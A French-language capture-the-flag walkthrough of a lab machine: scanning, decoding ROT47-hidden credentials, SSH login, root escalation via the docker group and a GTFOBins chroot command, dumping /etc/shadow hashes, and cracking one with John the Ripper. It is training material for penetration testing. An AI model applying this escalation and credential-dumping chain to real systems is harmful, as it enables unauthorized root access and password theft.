1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.74
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.74...100%
[+] Scan Nmap 192.168.56.74...100%

[+] 22/tcp open
[+] 80/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.74-tcp.html        |
==========================================================

```

&nbsp;

Allons voir ce qu’on trouve sur la page web

![Capture du 2025-02-04 21-23-24](https://github.com/user-attachments/assets/e3812316-2b3a-41c6-81d0-5e199c2f4fd9)


```
┌─[parrot@parrot]─[~]
└──╼ $curl http://192.168.56.74/

<!----------ROT47---------->  
</body>
</html>
```

&nbsp;

Allons déchiffrer `l'utilisateur` & `mot de passe` trouver précédemment

![decrypt_rot47](https://github.com/user-attachments/assets/361617c8-f81c-4cc7-83f1-3c8dc6aeb552)


```
D92:=6?5C2:shailendra
4J36CDA=@:E`:cybersploit1
```

&nbsp;

<span style="color: #dddddd;">🖥️</span> **NetExec**

Test en `SSH` des identifiants trouver

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $nxc ssh 192.168.56.74 -u shailendra -p cybersploit1
SSH         192.168.56.74   22     192.168.56.74    [*] SSH-2.0-OpenSSH_8.0
SSH         192.168.56.74   22     192.168.56.74    [+] shailendra:cybersploit1  Linux - Shell access!

```

&nbsp;

**<span style="color: #dddddd;">⚙️</span> GTFObin**

L’utilisateur est dans le groupe `docker`

```
[shailendra@localhost ~]$ id
uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

&nbsp;

Allons voir sur `GTFObins` si docker peut nous être utiles

![Capture du 2025-02-08 12-28-35](https://github.com/user-attachments/assets/950121af-0aab-49df-b2b6-a6ce686c41dc)


&nbsp;

Devenir root avec docker avec utilisateur `shailendra` grâce au `GTFObin`

```
[shailendra@localhost ~]$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
1f3e46996e29: Pull complete 
Digest: sha256:56fa17d2a7e7f168a043a2712e63aed1f8543aeafdcee47c58dcffe38ed51099
Status: Downloaded newer image for alpine:latest
sh-4.4# bash -i
[root@98e99a67f8c0 /]# 
```

&nbsp;

Dump des `hash` utilisateur

```
[root@98e99a67f8c0 centos]# cat /etc/shadow
root:$6$3d795XDPRsC3pMSF$pQYqtqY2ffdd/RR5zNnEcPUO5JMmsDXU8LjsFFGoAB84UmNosxjgYC.OESYKfpNhaaU1H2dyQY.4g46Vp70As.:18458:0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18456::::::
systemd-coredump:!!:18456::::::
systemd-resolve:!!:18456::::::
tss:!!:18456::::::
polkitd:!!:18456::::::
unbound:!!:18456::::::
sssd:!!:18456::::::
sshd:!!:18456::::::
rngd:!!:18456::::::
centos:$6$bUk/Dj.L.IjunflB$CF2HPXKM6GE8QGaMXpWa7KcTeiPFqb4bHkrkXxvrhXaPtP740vCqMj7WT4QW82bOM3Lzr2YPuc2zr9dvSMrM61::0:99999:7:::
shailendra:$6$X27PMCgNpVKj2WTf$7Ug3MPhwOCmAAHSKuulv88y/THusEchwZDxSVS8lq2llavEKHKE1QmjleJVo35jflcaeJcdCy7paXZ3PcePyN1:18457:0:99999:7:::
apache:!!:18457::::::
```

&nbsp;

**<span style="color: #dddddd;">🧨</span> JohnTheRipper**

Crack du hash de utilisateur `centos`

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $john hash 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA512"
Use the "--format=HMAC-SHA512" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
1234             (centos)     
1g 0:00:00:01 DONE 2/3 (2025-02-04 22:06) 0.5617g/s 1780p/s 1780c/s 1780C/s 123456..john
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~/Documents]
└──╼ $john --show hash 
centos:1234::0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| centos | 1234 |
| shailendra | cybersploit1 |
